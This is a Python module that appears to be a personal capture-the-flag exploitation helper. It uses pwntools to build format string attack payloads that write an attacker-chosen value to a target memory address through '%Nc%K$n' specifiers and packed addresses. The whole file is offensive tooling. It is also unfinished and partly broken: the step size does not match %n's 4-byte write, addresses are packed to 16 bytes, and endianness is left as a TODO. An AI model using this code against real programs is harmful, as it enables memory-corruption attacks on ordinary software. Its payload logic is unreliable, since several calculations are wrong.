'''
format_sring.py

Used to craft payloads for format string vulnerabilities

#TODO: add ability for auto detection an try to inject ourselves
       - if the string is in the heap, then it wont be possible to detect, however
       should still try to make it easy to extract format string data like flag data and whatnot
       - also you should still be able to overwrite if the string is on the stack, mostly because
       you just need an address to write data to, and there are plenty on the stack
       - would be cool to have something that helps find stack locations for you faster?? look input a cyclic pattern, or just type in the address value you had looked for and it tries to find stuff for you maybe?
       - might just end up fully integrating with pwntool
       - keep track of bytes that were written, that way you can write format string specifiers as needed
       - maybe some way where you just keep chaining your input and entering your requirement, then the payload gets generated
'''
import pwn

"""
#TODO: Allow the format specifiers and addresses to be accessed via variables
"""
class FormatString:
  def __init__(self, arch: str = 'amd64'):
    pwn.context.arch = arch
    self.arch = arch
    self.endian = pwn.context.endian
    self.bit_size = pwn.context.bits
    self.format_specifier = None
    self.addresses = None

  def build_payload(self, address : int, value : int, location : int):
    """ Builds a format string payload to be injected
        
        Sets the address to the value given
        #TODO: add the possibilty of injecting into the format string payload
        
        """
    step_size = 8
    self.format_specifier = self._build_format_string(location, value, step_size)
    self.addresses = self._build_addresses(address, step_size)
    return self.format_specifier + self.addresses

  def _build_format_string(self, format_location : int, value : int, step_size : int):
    """ Builds the format string that allows for the injection

        KNOW: %n - writes 4 bytes
              %hn - writes 2 bytes
              %hhn - writes 1 byte

        """
    format_string = []
    for i, format_int in enumerate(self._get_lsb(value, step_size)):
      format_string.append(f'%{format_int}c%{format_location+i}$n')
    
    return ''.join(format_string).encode('utf-8')

  def _get_lsb(self, value: int, size: int):
    """ Grabs the least significant bytes specified by the count
        
        #TODO: Should probably rename this better, could be confusing

        """
    mask = ((2 ** (8 * size)) - 1)

    while value != 0:
      yield mask & value
      value = value >> (size * 8)

  def _build_addresses(self, address : int, step_size: int):
    """ Builds the addresses that the format string pulls from

        #TODO: Account for endianess
        """
    address_count = self.bit_size // (8 * step_size) # Calculate how many addresses are required
  
    addresses = []
    for _ in range(address_count):
      addresses.append(address.to_bytes(16, self.endian))
      address += step_size
  
    return b''.join(addresses)

